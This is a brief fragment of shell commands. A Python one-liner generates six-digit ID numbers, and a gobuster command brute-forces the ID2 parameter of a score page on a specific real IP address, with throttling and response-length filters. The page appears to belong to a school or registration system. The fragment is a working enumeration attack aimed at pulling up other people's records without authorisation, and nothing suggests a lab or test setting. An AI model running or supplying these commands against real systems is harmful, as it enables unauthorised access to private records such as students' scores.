...
python3 -c 'for i in range(892208, 1000001): print(str(i).zfill(6))' > ids.txt
...
gobuster fuzz -u "http://163.16.246.199/s11/reg/score/20251124.asp?ID1=1410604&ID2=FUZZ" -w ids.txt --exclude-length 9820-9920 --excludestatuscodes 500 -t 1 --delay 2s
